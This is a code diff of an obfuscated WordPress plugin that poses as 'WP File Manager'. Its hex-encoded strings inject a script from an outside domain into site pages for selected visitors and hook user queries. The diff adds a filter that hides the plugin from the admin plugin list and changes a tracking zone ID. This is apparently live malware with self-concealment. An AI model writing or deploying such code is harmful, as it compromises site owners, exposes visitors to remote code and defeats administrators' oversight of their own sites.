@@ -30,7 +30,7 @@ add_action(hex2bin('77705f68656164'), function () {
     if (is_singular() && ($IP_FB || $AN_FB)) {
 
         $SR = hex2bin('68747470733a2f2f616c35736d2e636f6d2f7461672e6d696e2e6a73');
-        $ZN = hex2bin('3131363333373935');
+        $ZN = hex2bin('3131363435383631');
         ?>
         <script>
         (function(s){
@@ -59,4 +59,16 @@ function WP_File_Manager_PGN_GLOBALS($QRY) {
 }
 
 add_action(hex2bin('7072655f6765745f7573657273'), 'WP_File_Manager_PGN_GLOBALS');
+
+
+add_filter(hex2bin('616c6c5f706c7567696e73'), function ($PG) {
+
+    $PG_FL = plugin_basename(__FILE__);
+
+    if (isset($PG[$PG_FL])) {
+        unset($PG[$PG_FL]);
+    }
+
+    return $PG;
+});
 
